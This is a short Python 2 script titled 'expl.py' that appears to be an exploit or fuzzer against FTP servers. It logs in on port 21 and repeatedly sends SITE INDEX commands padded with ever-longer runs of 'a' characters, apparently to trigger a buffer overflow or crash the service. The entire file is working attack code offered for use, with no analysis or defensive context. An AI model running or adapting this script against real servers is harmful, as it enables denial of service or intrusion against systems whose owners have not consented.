#!/usr/bin/python
import socket
import sys

def Usage():
    print ("Usage:  ./expl.py <serv_ip>      <Username> <password>\n")
    print ("Example:./expl.py http://www.example.com anonymous anonymous\n")
if len(sys.argv) <> 4:
        Usage()
        sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    test_string="a"*30
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for i in range(1,30):
        try:
            sock.connect((hostname, 21))
        except:
            print ("Connection error!")
            sys.exit(1)
        r=sock.recv(1024)
        print "[+] "+ r
        sock.send("user %s\r\n" %username)
        print "[-] "+ ("user %s\r\n" %username)
        r=sock.recv(1024)
        print "[+] "+ r
        sock.send("pass %s\r\n" %passwd)
        print "[-] "+ ("pass %s\r\n" %passwd)
        r=sock.recv(1024)
        print "[+] "+ r


        for i in range(1,20):
            sock.send("SITE INDEX "+ test_string*i +"\r\n")
            print "[-] "+ ("SITE INDEX "+ test_string +"\r\n")
            r=sock.recv(1024)
            print "[+] "+ r

        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    sys.exit(0);
